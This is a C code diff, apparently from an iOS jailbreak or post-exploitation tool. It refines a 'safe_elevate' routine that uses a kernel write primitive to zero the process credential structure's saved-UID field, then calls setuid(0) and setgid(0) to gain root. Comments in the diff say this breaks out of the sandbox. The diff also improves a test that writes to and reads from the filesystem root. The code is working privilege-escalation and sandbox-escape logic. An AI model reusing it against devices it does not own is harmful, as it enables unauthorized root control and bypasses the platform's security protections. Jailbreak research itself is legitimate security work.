@@ -20,25 +20,21 @@ int safe_elevate(krw_handlers *toolbox, pid_t pid)
 
     uint32_t root = 0;
 
-    // set group and user id to 0
-    // apparently nullifying all the other kern struct variables isn't required
-    if (toolbox->kwrite(&root, ucred_s + __cr_uid, sizeof(uint32_t)) ||
-        toolbox->kwrite(&root, ucred_s + __cr_ruid, sizeof(uint32_t)) ||
-        toolbox->kwrite(&root, ucred_s + __cr_rgid, sizeof(uint32_t)) ||
-        toolbox->kwrite(&root, ucred_s + __cr_svgid, sizeof(uint32_t)) ||
-        toolbox->kwrite(&root, ucred_s + __cr_svuid, sizeof(uint32_t)))
+    if (toolbox->kwrite(&root, ucred_s + __cr_svuid, sizeof(uint32_t)))
     {
         printf("Ucred writing failed!");
         return 1;
     }
 
-    if (getuid() != 0) // apparently this just works after nulling __cs_svuid??
+    // yes, setuid(0) need to be called twice - from taurine
+    if (setuid(0) || setuid(0) || setgid(0) || getuid()) // apparently this just works after nulling __cs_svuid??
     {
-        printf("Elevation failed :( UID: %d\n", getuid());
+        printf("Elevation failed :( UID: %d ", getuid());
         return 1;
     }
 
-    return 0;
+    printf("I'm freeee - UID: %d ", getuid());
+    return 0; // apparently getting root is enough to break out of sandbox?
 }
 
 int copy_ucred(krw_handlers *toolbox, pid_t from, pid_t to)
@@ -74,14 +70,15 @@ int copy_ucred(krw_handlers *toolbox, pid_t from, pid_t to)
 
 int testRW()
 {
-    FILE *fptr = fopen("/test.txt", "rw");
+    const char *name = "/test.txt";
+    FILE *fptr = fopen(name, "w+");
 
     char string[] = "hello world!";
     char *buffer = malloc(sizeof(string));
 
     int status = 1;
 
-    if (!(fptr && fwrite(string, sizeof(char), sizeof(string), fptr)))
+    if (!fptr || !fwrite(string, sizeof(char), sizeof(string), fptr))
         printf("Failed to write to root! :(\n");
     else
     {
@@ -90,13 +87,20 @@ int testRW()
 
         if (!fread(buffer, sizeof(char), sizeof(string), fptr))
             printf("failed to read file from root! :( \n");
+        else if (strcmp(string, buffer))
+            printf("Partial r/w?? wrote: %s but read %s\n", string, buffer);
         else
         {
-            status = 1;
-            printf("Wrote: %s, read %s\n", string, buffer);
+            status = 0;
+            printf("R/W works!");
+        }
+
+        if (fclose(fptr) || remove(name))
+        {
+            printf("Error closing/removing file...");
+            fclose(fptr);
         }
     }
 
-    fclose(fptr);
     return status;
 }
